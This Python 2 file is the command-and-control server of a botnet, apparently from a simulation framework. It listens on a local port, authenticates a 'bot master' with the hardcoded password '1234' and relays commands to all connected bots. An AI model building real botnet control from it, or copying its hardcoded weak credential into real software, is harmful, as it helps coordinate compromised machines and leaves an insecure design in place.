#!/usr/bin/env python
from base import CMD
from Node import Node

info = {
        'srv_addr':'127.0.0.1',
        'srv_port':3333,
        'request_timeout':10,
    }
client_fsm = {
        'waiting -> send_ack' : 'request_conn',
        'waiting -> send_cmd' : 'get_cmd',
        'initial' : 'waiting',
        'start_action' : 'initialize',
        'info' : info,
        }
keywords = ['initial', 'info']

BOT_MASTER_PASSWORD = '1234'


class ServerCMD(CMD):
    def __init__(self, fsm_desc):
        CMD.__init__(self, 'server_cmd', fsm_desc)

    def _is_okay(self, node): return True

    def initialize(self):
        srv_sock = self.node.create_server_socket()
        self.node.sock_bind(srv_sock, 3333)
        self.node.sock_listen(srv_sock, 5)
        self.node.set_state('waiting')

        while True:
            client_sock, address = self.node.sock_accept(srv_sock)
            self._trigger('request_conn', client_sock, address)

    def request_conn(self, client_sock, address):
        print 'receive request from addr: ', address
        self.node.sock_send(client_sock, 'connect_ack')
        self.node.sock_thread_recv(client_sock, 512, self.dispatcher)
        # self.node.sock_recv(client_sock, 512, self.dispatcher)
        # print self.node.client_socks

    def dispatcher(self, sock, data):
        print 'dispatcher, recv data', data
        try:
            print 'data, ', data
            event = data.rsplit(' > ')[0]
            user_data =  data.rsplit(' > ')[1]
            self._trigger(event, sock, user_data)
        except Exception as e:
            import traceback
            traceback.print_stack()
            print e
            print 'unknow message: %s from %s '%(data, self.node.sockets[sock])
            self.node.sock_send(sock, 'you have sent me a unknown message')

    def verify_master(self, sock, data):
        password = data.rsplit('password:')[1]
        if password == BOT_MASTER_PASSWORD:
            print 'bot master password verfied'
            self.node.set_master_sock(sock)
            self.node.sock_send(sock, 'verifed, hi master, what you want to do? ')

    def send_message_to_all(self, sock, data):
        print 'start to send_message_to_all'
        for client_sock in self.node.client_socks:
            print 'client_sock', client_sock
            self.node.sock_send(client_sock, data)

    def disconnect(self, sock):
        print 'receive disconnect request'
        return False





if __name__ == "__main__":
    cmd = ServerCMD(client_fsm)
    node = Node()
    cmd.install(node)
    node.start()


